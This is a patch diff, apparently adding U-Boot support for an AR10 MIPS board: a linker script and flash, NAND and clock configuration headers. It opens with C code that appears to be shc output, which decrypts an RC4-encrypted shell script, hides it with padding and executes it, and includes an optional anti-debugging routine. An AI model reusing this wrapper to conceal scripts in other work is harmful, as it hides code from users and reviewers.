+#define      hide_z	4096
+#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
+#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */
+
+/* rtc.c */
+
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+
+/* 'Alleged RC4' */
+
+static unsigned char stte[256], indx, jndx, kndx;
+
+/*
+ * Reset arc4 stte. 
+ */
+void stte_0(void)
+{
+	indx = jndx = kndx = 0;
+	do {
+		stte[indx] = indx;
+	} while (++indx);
+}
+
+/*
+ * Set key. Can be used more than once. 
+ */
+void key(void * str, int len)
+{
+	unsigned char tmp, * ptr = (unsigned char *)str;
+	while (len > 0) {
+		do {
+			tmp = stte[indx];
+			kndx += tmp;
+			kndx += ptr[(int)indx % len];
+			stte[indx] = stte[kndx];
+			stte[kndx] = tmp;
+		} while (++indx);
+		ptr += 256;
+		len -= 256;
+	}
+}
+
+/*
+ * Crypt data. 
+ */
+void arc4(void * str, int len)
+{
+	unsigned char tmp, * ptr = (unsigned char *)str;
+	while (len > 0) {
+		indx++;
+		tmp = stte[indx];
+		jndx += tmp;
+		stte[indx] = stte[jndx];
+		stte[jndx] = tmp;
+		tmp += stte[indx];
+		*ptr ^= stte[tmp];
+		ptr++;
+		len--;
+	}
+}
+
+/* End of ARC4 */
+
+/*
+ * Key with file invariants. 
+ */
+int key_with_file(char * file)
+{
+	struct stat statf[1];
+	struct stat control[1];
+
+	if (stat(file, statf) < 0)
+		return -1;
+
+	/* Turn on stable fields */
+	memset(control, 0, sizeof(control));
+	control->st_ino = statf->st_ino;
+	control->st_dev = statf->st_dev;
+	control->st_rdev = statf->st_rdev;
+	control->st_uid = statf->st_uid;
+	control->st_gid = statf->st_gid;
+	control->st_size = statf->st_size;
+	control->st_mtime = statf->st_mtime;
+	control->st_ctime = statf->st_ctime;
+	key(control, sizeof(control));
+	return 0;
+}
+
+#if DEBUGEXEC
+void debugexec(char * sh11, int argc, char ** argv)
+{
+	int i;
+	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
+	fprintf(stderr, "argc=%d\n", argc);
+	if (!argv) {
+		fprintf(stderr, "argv=<null>\n");
+	} else { 
+		for (i = 0; i <= argc ; i++)
+			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
+	}
+}
+#endif /* DEBUGEXEC */
+
+void rmarg(char ** argv, char * arg)
+{
+	for (; argv && *argv && *argv != arg; argv++);
+	for (; argv && *argv; argv++)
+		*argv = argv[1];
+}
+
+int chkenv(int argc)
+{
+	char buff[512];
+	unsigned long mask, m;
+	int l, a, c;
+	char * string;
+	extern char ** environ;
+
+	mask  = (unsigned long)&chkenv;
+	mask ^= (unsigned long)getpid() * ~mask;
+	sprintf(buff, "x%lx", mask);
+	string = getenv(buff);
+#if DEBUGEXEC
+	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
+#endif
+	l = strlen(buff);
+	if (!string) {
+		/* 1st */
+		sprintf(&buff[l], "=%lu %d", mask, argc);
+		putenv(strdup(buff));
+		return 0;
+	}
+	c = sscanf(string, "%lu %d%c", &m, &a, buff);
+	if (c == 2 && m == mask) {
+		/* 3rd */
+		rmarg(environ, &string[-l - 1]);
+		return 1 + (argc - a);
+	}
+	return -1;
+}
+
+#if !TRACEABLE
+
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#endif
+void untraceable(char * argv0)
+{
+	char proc[80];
+	int pid, mine;
+
+	switch(pid = fork()) {
+	case  0:
+		pid = getppid();
+		/* For problematic SunOS ptrace */
+#if defined(__FreeBSD__)
+		sprintf(proc, "/proc/%d/mem", (int)pid);
+#else
+		sprintf(proc, "/proc/%d/as",  (int)pid);
+#endif
+		close(0);
+		mine = !open(proc, O_RDWR|O_EXCL);
+		if (!mine && errno != EBUSY)
+			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
+		if (mine) {
+			kill(pid, SIGCONT);
+		} else {
+			perror(argv0);
+			kill(pid, SIGKILL);
+		}
+		_exit(mine);
+	case -1:
+		break;
+	default:
+		if (pid == waitpid(pid, 0, 0))
+			return;
+	}
+	perror(argv0);
+	_exit(1);
+}
+#endif /* !TRACEABLE */
+
+char * xsh(int argc, char ** argv)
+{
+	char * scrpt;
+	int ret, i, j;
+	char ** varg;
+
+	stte_0();
+	 key(pswd, pswd_z);
+	arc4(msg1, msg1_z);
+	arc4(date, date_z);
+	if (date[0] && (atoll(date)<time(NULL)))
+		return msg1;
+	arc4(shll, shll_z);
+	arc4(inlo, inlo_z);
+	arc4(xecc, xecc_z);
+	arc4(lsto, lsto_z);
+	arc4(tst1, tst1_z);
+	 key(tst1, tst1_z);
+	arc4(chk1, chk1_z);
+	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
+		return tst1;
+	ret = chkenv(argc);
+	arc4(msg2, msg2_z);
+	if (ret < 0)
+		return msg2;
+	varg = (char **)calloc(argc + 10, sizeof(char *));
+	if (!varg)
+		return 0;
+	if (ret) {
+		arc4(rlax, rlax_z);
+		if (!rlax[0] && key_with_file(shll))
+			return shll;
+		arc4(opts, opts_z);
+		arc4(text, text_z);
+		arc4(tst2, tst2_z);
+		 key(tst2, tst2_z);
+		arc4(chk2, chk2_z);
+		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
+			return tst2;
+		if (text_z < hide_z) {
+			/* Prepend spaces til a hide_z script size. */
+			scrpt = malloc(hide_z);
+			if (!scrpt)
+				return 0;
+			memset(scrpt, (int) ' ', hide_z);
+			memcpy(&scrpt[hide_z - text_z], text, text_z);
+		} else {
+			scrpt = text;	/* Script text */
+		}
+	} else {			/* Reexecute */
+		if (*xecc) {
+			scrpt = malloc(512);
+			if (!scrpt)
+				return 0;
+			sprintf(scrpt, xecc, argv[0]);
+		} else {
+			scrpt = argv[0];
+		}
+	}
+	j = 0;
+	varg[j++] = argv[0];		/* My own name at execution */
+	if (ret && *opts)
+		varg[j++] = opts;	/* Options on 1st line of code */
+	if (*inlo)
+		varg[j++] = inlo;	/* Option introducing inline code */
+	varg[j++] = scrpt;		/* The script itself */
+	if (*lsto)
+		varg[j++] = lsto;	/* Option meaning last option */
+	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
+	while (i < argc)
+		varg[j++] = argv[i++];	/* Main run-time arguments */
+	varg[j] = 0;			/* NULL terminated array */
+#if DEBUGEXEC
+	debugexec(shll, j, varg);
+#endif
+	execvp(shll, varg);
+	return shll;
+}
+
+int main(int argc, char ** argv)
+{
+#if DEBUGEXEC
+	debugexec("main", argc, argv);
+#endif
+#if !TRACEABLE
+	untraceable(argv[0]);
+#endif
+	argv[1] = xsh(argc, argv);
+	fprintf(stderr, "%s%s%s: %s\n", argv[0],
+		errno ? ": " : "",
+		errno ? strerror(errno) : "",
+		argv[1] ? argv[1] : "<null>"
+	);
+	return 1;
+}
diff --git a/board/ar10/u-boot.lds b/board/ar10/u-boot.lds
new file mode 100644
--- /dev/null
+++ b/board/ar10/u-boot.lds
@@ -0,0 +1,70 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+OUTPUT_FORMAT("elf32-bigmips", "elf32-bigmips", "elf32-bigmips")
+*/
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start)
+SECTIONS
+{
+        . = 0x00000000;
+
+        . = ALIGN(4);
+	.text       :
+	{
+	  *(.text)
+	}
+
+        . = ALIGN(4);
+        .rodata  : { *(.rodata) }
+
+        . = ALIGN(4);
+        .data  : { *(.data) }
+
+	. = ALIGN(4);
+	.sdata  : { *(.sdata) }
+
+	_gp = ALIGN(16);
+
+	. = ALIGN(16);
+	__got_start = .;
+	.got  : { *(.got) }
+	__got_end = .;
+
+	.sdata  : { *(.sdata) }
+
+	. = .;
+        __u_boot_cmd_start = .;
+        .u_boot_cmd : { *(.u_boot_cmd) }
+        __u_boot_cmd_end = .;
+    got_size = (__got_end - __got_start);
+	uboot_end_data = .;
+	num_got_entries = (__got_end - __got_start) >> 2;
+
+        . = ALIGN(4);
+	.sbss  : { *(.sbss) }
+        .bss  : { *(.bss) }
+	uboot_end = .;
+}
diff --git a/include/configs/ar10.h b/include/configs/ar10.h
new file mode 100644
--- /dev/null
+++ b/include/configs/ar10.h
@@ -0,0 +1,368 @@
+/*
+ * (C) Copyright 2003-2005
+ * Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+ * This file contains the configuration parameters for the AR9 board.
+ */
+
+#ifndef __CONFIG_H
+#define __CONFIG_H
+
+#include <configs/autoconf.h>
+#include <configs/lq_cfg.h>
+#include <asm/ar10.h>
+
+
+#ifdef CONFIG_AR10_CPU_125M_RAM_125M
+#define CPU_CLOCK_RATE          125000000   /* 125 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          125000000   /* 125 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_250M_RAM_125M)
+#define CPU_CLOCK_RATE          250000000   /* 250 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          125000000   /* 125 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_250M_RAM_250M)
+#define CPU_CLOCK_RATE          250000000   /* 250 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          250000000   /* 250 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_500M_RAM_250M)
+#define CPU_CLOCK_RATE          500000000   /* 500 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          250000000   /* 250 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_150M_RAM_150M)
+#define CPU_CLOCK_RATE          150000000   /* 150 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          150000000   /* 150 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_300M_RAM_150M)
+#define CPU_CLOCK_RATE          300000000   /* 300 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          150000000   /* 150 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_300M_RAM_300M)
+#define CPU_CLOCK_RATE          300000000   /* 300 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          300000000   /* 300 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_500M_RAM_200M)
+#define CPU_CLOCK_RATE          500000000   /* 500 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          200000000   /* 250 MHz clock for RAM           */
+#elif defined(CONFIG_AR10_CPU_600M_RAM_300M)
+#define CPU_CLOCK_RATE          600000000   /* 600 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          300000000   /* 300 MHz clock for RAM           */
+#elif defined(CONFIG_GRX390_CPU_666M_RAM_333M)
+#define CPU_CLOCK_RATE          666000000   /* 666 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          333000000   /* 333 MHz clock for RAM           */
+#elif defined(CONFIG_GRX390_CPU_180M_RAM_180M)
+#define CPU_CLOCK_RATE          180000000   /* 180 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          180000000   /* 180 MHz clock for RAM           */
+#elif defined(CONFIG_GRX390_CPU_360M_RAM_180M)
+#define CPU_CLOCK_RATE          360000000   /* 360 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          180000000   /* 180 MHz clock for RAM           */
+#elif defined(CONFIG_GRX390_CPU_360M_RAM_360M)
+#define CPU_CLOCK_RATE          360000000   /* 360 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          360000000   /* 360 MHz clock for RAM           */
+#elif defined(CONFIG_GRX390_CPU_720M_RAM_360M)
+#define CPU_CLOCK_RATE          720000000   /* 720 MHz clock for the MIPS core */
+#define RAM_CLOCK_RATE          360000000   /* 360 MHz clock for RAM           */
+#elif defined(CONFIG_GRX390_CPUFREQ_AUTO_DETECT)
+#define IS_FUSED ((REG32(AR10_ID_CFG) & 0x20000) ?  1 : 0)
+#define CPU_CLOCK_RATE 	((IS_FUSED) ? 600000000 : 720000000)
+#define RAM_CLOCK_RATE  ((IS_FUSED) ? 300000000 : 360000000)
+#endif
+
+#define F_SSC_CLK  get_fpi_clk()
+#define CONFIG_SYS_HZ 1000
+#define CONFIG_ENV_SPI_CS 0
+#define CONFIG_ENV_SPI_MODE CONFIG_SF_DEFAULT_MODE
+
+
+
+#ifndef	CPU_CLOCK_RATE
+/* allowed values: 100000000, 133000000, and 150000000 */
+#define CPU_CLOCK_RATE	150000000	/* default: 150 MHz clock for the MIPS core */
+#endif
+
+//#define CONFIG_BAUDRATE		115200
+//#define CONFIG_BAUDRATE           2400
+
+/* valid baudrates */
+#define CONFIG_SYS_BAUDRATE_TABLE	{ 9600, 19200, 38400, 57600, 115200 }
+
+#define CONFIG_SYS_ASC_BASE 0xbe100c00
+#define	CONFIG_TIMESTAMP		/* Print image info with timestamp */
+
+#ifndef CONFIG_PREBOOT
+#define CONFIG_PREBOOT	"echo;"	\
+	"echo Type \\\"run flash_nfs\\\" to mount root filesystem over NFS;" \
+	"echo"
+#endif
+
+#undef	CONFIG_BOOTARGS
+
+#define CONFIG_EXTRA_ENV_SETTINGS   <configs/lq_extra_env.h>
+
+/*
+ * Miscellaneous configurable options
+ */
+#define	CONFIG_SYS_LONGHELP				/* undef to save memory      */
+#ifndef CONFIG_DRIVER_GRX390
+#define	CONFIG_SYS_PROMPT		"AR10 # "	/* Monitor Command Prompt    */
+#else
+#define	CONFIG_SYS_PROMPT		"GRX330 # "	/* Monitor Command Prompt    */
+#endif /* DRIVER_GRX390 */
+#define	CONFIG_SYS_CBSIZE		1024		/* Console I/O Buffer Size   */
+#define	CONFIG_SYS_PBSIZE (CONFIG_SYS_CBSIZE+sizeof(CONFIG_SYS_PROMPT)+16)  /* Print Buffer Size */
+#define	CONFIG_SYS_MAXARGS		32		/* max number of command args*/
+
+#ifdef CONFIG_BOOT_FROM_NAND
+#define CONFIG_SYS_MALLOC_LEN		CONFIG_NAND_PAGE_SIZE*1024*2
+#else
+#define CONFIG_SYS_MALLOC_LEN       512*1024
+#endif
+
+#define CONFIG_SYS_BOOTPARAMS_LEN	256*1024
+
+#define CONFIG_SYS_MIPS_TIMER_FREQ	CPU_CLOCK_RATE/2
+
+
+#define CONFIG_SYS_SDRAM_BASE		0x80000000
+
+#define	CONFIG_SYS_LOAD_ADDR		0x80100000	/* default load address	*/
+
+#define CONFIG_SYS_MEMTEST_START	0x80100000
+#define CONFIG_SYS_MEMTEST_END		0x80800000
+
+/*-----------------------------------------------------------------------
+ * FLASH and environment organization
+ */
+#define CONFIG_SYS_MAX_FLASH_BANKS	1	/* max number of memory banks */
+#define CONFIG_SYS_MAX_FLASH_SECT	(256)	/* max number of sectors on one chip */
+
+#define PHYS_FLASH_1		0xb0000000 /* Flash Bank #1 */
+#define PHYS_FLASH_2		0xb0800000 /* Flash Bank #2 */
+
+#define CONFIG_SYS_FLASH_SWAP_ADDR
+
+#define FLASH_FIXUP_ADDR_8(addr)        ((void*)((ulong)(addr)^2))
+#define FLASH_FIXUP_ADDR_16(addr)       ((void*)((ulong)(addr)^2))
+
+#define CONFIG_SYS_FLASH_CFI_WIDTH      FLASH_CFI_16BIT
+
+#define CONFIG_EBU_ADDSEL0               0x10000031
+#define CONFIG_EBU_BUSCON0               0x0001D7FF
+
+
+/* The following #defines are needed to get flash environment right */
+#define	CONFIG_SYS_MONITOR_BASE	CONFIG_RAM_TEXT_BASE
+
+#define	CONFIG_SYS_MONITOR_LEN		(512 << 10)
+
+#define CONFIG_SYS_INIT_SP_OFFSET	0x400000
+
+#define CONFIG_SYS_FLASH_BASE		PHYS_FLASH_1
+
+/* timeout values are in ticks */
+#define CONFIG_SYS_FLASH_ERASE_TOUT	(2 * CONFIG_SYS_HZ) /* Timeout for Flash Erase */
+#define CONFIG_SYS_FLASH_WRITE_TOUT	(2 * CONFIG_SYS_HZ) /* Timeout for Flash Write */
+
+
+#define CONFIG_FLASH_16BIT
+
+#define CONFIG_NR_DRAM_BANKS	1
+
+#define CONFIG_NET_MULTI
+
+#define CONFIG_SYS_MAX_NAND_DEVICE    1
+#ifdef CONFIG_NAND_CS0
+#define CONFIG_SYS_NAND_BASE   0xb0000000
+#else
+#define CONFIG_SYS_NAND_BASE   0xb4000000
+#endif
+#define NAND_BASE_ADDRESS  CONFIG_SYS_NAND_BASE
+#define NAND_WRITE(addr, val)     *((volatile u8*)(NAND_BASE_ADDRESS | (addr))) = val;while((*EBU_NAND_WAIT & 0x08) == 0);
+#define NAND_READ(addr, val)      val = *((volatile u8*)(NAND_BASE_ADDRESS | (addr)));while((*EBU_NAND_WAIT & 0x08) == 0);
+
+#ifdef CONFIG_NAND_CS0
+#define NAND_CE_SET         *EBU_NAND_CON |= 1<<20;
+#define NAND_CE_CLEAR       *EBU_NAND_CON &= ~(1<<20);
+#else
+#define NAND_CE_SET         *EBU_NAND_CON   = 0x00F405F3
+#define NAND_CE_CLEAR       *EBU_NAND_CON   = 0x000005F3
+#endif
+
+//#define NAND_READY       ( ((*EBU_NAND_WAIT)&0x07) == 7)
+#define NAND_READY       ( ((*EBU_NAND_WAIT)&0x01) == 1)
+
+#define NAND_READY_CLEAR  *EBU_NAND_WAIT = 0;
+#define WRITE_CMD    0x18
+#define WRITE_ADDR   0x14
+#define WRITE_LADDR  0x10
+#define WRITE_DATA  0x10
+#define READ_DATA    0x10
+#define READ_LDATA   0x00
+#define ACCESS_WAIT
+#define IFX_ATC_NAND 0xc176
+#define IFX_BTC_NAND 0xc166
+#define ST_512WB2_NAND 0x2076
+#define NAND_LATCH_ENABLE 
+#define NAND_CLRALE  *EBU_NAND_CON &=~(1<<18);
+#define NAND_SETALE  *EBU_NAND_CON |=1<<18; 
+#define NAND_CLRCLE  *EBU_NAND_CON &=~(1<<19);
+#define NAND_SETCLE  *EBU_NAND_CON |=1<<19;
+
+
+
+#define NAND_DISABLE_CE(nand) *EBU_NAND_CON = *EBU_NAND_CON & ~(1<<20);
+#define NAND_ENABLE_CE(nand)  *EBU_NAND_CON = *EBU_NAND_CON |(1<<20);
+#define NAND_WAIT_READY(nand) while(!NAND_READY){}
+#define WRITE_NAND_COMMAND(d, adr) NAND_WRITE(WRITE_CMD,d);
+#define WRITE_NAND_ADDRESS(d, adr) NAND_WRITE(WRITE_ADDR,d);
+#define WRITE_NAND(d, adr) NAND_WRITE(WRITE_DATA,d);
+#define READ_NAND(adr) *((volatile u8*)(NAND_BASE_ADDRESS | (READ_DATA)))
+#define IFX_NAND_CTL_CLRALE *EBU_NAND_CON &=~(1<<18);
+#define IFX_NAND_CTL_SETALE *EBU_NAND_CON |=1<<18;
+
+
+//#define CONFIG_SYS_NAND_PAGE_SIZE   ( 2<<10 )   /* NAND chip page size        */
+//#define CONFIG_SYS_NAND_BLOCK_SIZE  ( 256 << 10 ) /* NAND chip block size       */
+
+#define CONFIG_SYS_NAND_PAGE_SIZE   CONFIG_NAND_PAGE_SIZE   /* NAND chip page size        */
+#define CONFIG_SYS_NAND_BLOCK_SIZE  CONFIG_NAND_BLOCK_SIZE /* NAND chip block size       */
+#define CONFIG_SYS_NAND_PAGE_COUNT  (CONFIG_SYS_NAND_BLOCK_SIZE / CONFIG_SYS_NAND_PAGE_SIZE)
+/* NAND chip page count       */
+
+
+#if (CONFIG_NAND_PAGE_SIZE == 0x200 )
+   #define CONFIG_SYS_NAND_BAD_BLOCK_POS   5       /* Location of bad block marker*/
+   #define CONFIG_SYS_NAND_OOBSIZE 16
+   #define CONFIG_SYS_NAND_ECCPOS      {0, 1, 2, 3, 6, 7}
+   #if (CONFIG_NAND_FLASH_SIZE>=32)
+    #define CONFIG_SYS_NAND_4_ADDR_CYCLE
+   #endif
+ #else
+   #define CONFIG_SYS_NAND_BAD_BLOCK_POS   0       /* Location of bad block marker*/
+   #define CONFIG_SYS_NAND_OOBSIZE 64
+   #define CONFIG_SYS_NAND_ECCPOS      {40, 41, 42, 43, 44, 45, 46, 47, \
+                                        48, 49, 50, 51, 52, 53, 54, 55, \
+                                        56, 57, 58, 59, 60, 61, 62, 63}
+   #define CONFIG_SYS_NAND_5_ADDR_CYCLE            /* Fifth addr used (<=128MB)  */
+#endif
+
+
+
+#define CONFIG_SYS_NAND_ECCSIZE 256
+#define CONFIG_SYS_NAND_ECCBYTES    3
+#define CONFIG_SYS_NAND_ECCSTEPS    (CONFIG_SYS_NAND_PAGE_SIZE / CONFIG_SYS_NAND_ECCSIZE)
+#define CONFIG_SYS_NAND_ECCTOTAL    (CONFIG_SYS_NAND_ECCBYTES * CONFIG_SYS_NAND_ECCSTEPS)
+
+
+#define CONFIG_SYS_NAND_U_BOOT_SIZE  ( 256 << 10 )
+
+#ifdef CONFIG_LTQ_SECURE_BOOT 
+#define CONFIG_SYS_NAND_U_BOOT_DST   CONFIG_STAGE2_LOADADDR
+#define CONFIG_SYS_NAND_U_BOOT_START CONFIG_STAGE2_LOADADDR
+#else 
+#define CONFIG_SYS_NAND_U_BOOT_DST   CONFIG_BOOTSTRAP_TEXT_BASE
+#define CONFIG_SYS_NAND_U_BOOT_START CONFIG_BOOTSTRAP_TEXT_BASE
+#endif
+
+#ifdef CONFIG_NAND_ECC_HW_REED_SOLOMON
+#define CONFIG_SYS_NAND_U_BOOT_OFFS  ( CONFIG_MLC_NAND_HEADER_NUMBER * 32768 )
+#else
+#define CONFIG_SYS_NAND_U_BOOT_OFFS  CONFIG_NAND_SPL_BLOCK_SIZE
+#endif
+
+#ifdef CONFIG_BOOT_FROM_NOR
+#define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0xB000FFE0
+#define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+#define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0xb000ffff
+#elif defined(CONFIG_BOOT_FROM_SPI)
+#define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x0000FFE0
+#define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+#define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x0000ffff
+#define CONFIG_ENV_SECT_SIZE 0x1000
+#else /*CONFIG_BOOT_FRON_NAND*/
+ #ifdef CONFIG_NAND_ECC_HW_REED_SOLOMON
+   #define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x0003ffe0
+   #define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+   #define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x0003ffff 
+ #else
+  #ifdef CONFIG_LTQ_SECURE_BOOT
+   #define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x00007fe0
+   #define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+   #define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x00007fff
+  #else
+   #define IFX_CFG_FLASH_DDR_CFG_START_ADDR      0x00003fe0
+   #define IFX_CFG_FLASH_DDR_CFG_SIZE            32
+   #define IFX_CFG_FLASH_DDR_CFG_END_ADDR        0x00003fff
+  #endif
+ #endif
+#endif
+
+/* Address and size of Primary Environment Sector	*/
+#if (defined CONFIG_CMD_UBI) && !(defined CONFIG_NAND_ECC_HW) 
+#define CONFIG_ENV_OFFSET     0x100000
+#define CONFIG_ENV_ADDR       CONFIG_ENV_OFFSET
+#define CONFIG_NAND_ENV_DST   (CONFIG_SYS_NAND_U_BOOT_DST + CONFIG_SYS_NAND_U_BOOT_SIZE)
+#elif (defined CONFIG_CMD_UBI) && (defined CONFIG_NAND_ECC_HW)
+#define CONFIG_ENV_OFFSET     0x200000
+#define CONFIG_ENV_ADDR       0x200000
+#define CONFIG_NAND_ENV_DST   (CONFIG_SYS_NAND_U_BOOT_DST + CONFIG_SYS_NAND_U_BOOT_SIZE)
+#else
+#define CONFIG_ENV_OFFSET	  IFX_CFG_FLASH_UBOOT_CFG_START_ADDR
+#define CONFIG_ENV_ADDR		  IFX_CFG_FLASH_UBOOT_CFG_START_ADDR
+#ifndef CONFIG_ENV_IS_NOWHERE
+#define CONFIG_ENV_SIZE       IFX_CFG_FLASH_UBOOT_CFG_SIZE
+#else
+#define CONFIG_ENV_SIZE       0x1000
+#endif
+#endif
+
+
+/*define u-boot env range, only meaningful for nand flash*/
+#ifndef CONFIG_NAND_ECC_HW
+  #ifdef CONFIG_ENV_REDUND
+     #define CONFIG_ENV_OFFSET_REDUND    0x140000
+     #define CONFIG_ENV_SIZE_REDUND      CONFIG_ENV_SIZE
+     #define CONFIG_ENV_RANGE            0x40000
+  #else
+     #define CONFIG_ENV_RANGE            0x80000
+  #endif
+#else
+  #ifdef CONFIG_ENV_REDUND
+     #define CONFIG_ENV_OFFSET_REDUND    0x600000
+     #define CONFIG_ENV_SIZE_REDUND      CONFIG_ENV_SIZE
+     #define CONFIG_ENV_RANGE            0x400000
+  #else
+     #define CONFIG_ENV_RANGE            0x800000
+     #endif
+#endif
+
+
+/*********************************************************/
+
+//#define CONFIG_SYS_RX_ETH_BUFFER        8
+
+#define CONFIG_TUNING_STATUS 0xBE1A7F2C 
+//#define CONFIG_TUNING_SP     0xBE22FF00 
+
+#ifdef CONFIG_DEBUG
+#define DEBUG
+#endif
+
+#define MTDIDS_DEFAULT   CONFIG_MTDIDS
+#define MTDPARTS_DEFAULT CONFIG_MTDPARTS
+
+
+#endif	/* __CONFIG_H */
diff --git a/include/configs/ar10_cfg.h b/include/configs/ar10_cfg.h
new file mode 100755
--- /dev/null
+++ b/include/configs/ar10_cfg.h
@@ -0,0 +1,1812 @@
+/* ============================================================================
+ * Copyright (C) 2003[- 2004] ? Infineon Technologies AG.
+ *
+ * All rights reserved.
+ * ============================================================================
+ *
+ * ============================================================================
+ *
+ * This document contains proprietary information belonging to Infineon
+ * Technologies AG. Passing on and copying of this document, and communication
+ * of its contents is not permitted without prior written authorisation.
+ *
+ * ============================================================================
+ *
+ * File Name: ifx_cfg.h
+ * Author : Mars Lin (mars.lin@infineon.com)
+ * Date:
+ *
+ * ===========================================================================
+ *
+ * Project:
+ * Block:
+ *
+ * ===========================================================================
+ * Contents:  This file contains the data structures and definitions used
+ *        by the core iptables and the sip alg modules.
+ * ===========================================================================
+ * References:
+ */
+
+/*
+ * This file contains the configuration parameters for the IFX board.
+ */
+
+
+/*-----------------------------------------------------------------------
+ * Board specific configurations
+ */
+#if defined(CONFIG_BOOT_FROM_NOR) || defined(CONFIG_BOOT_FROM_UART)
+
+#ifdef CONFIG_NOR_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_NOR_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_NOR_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
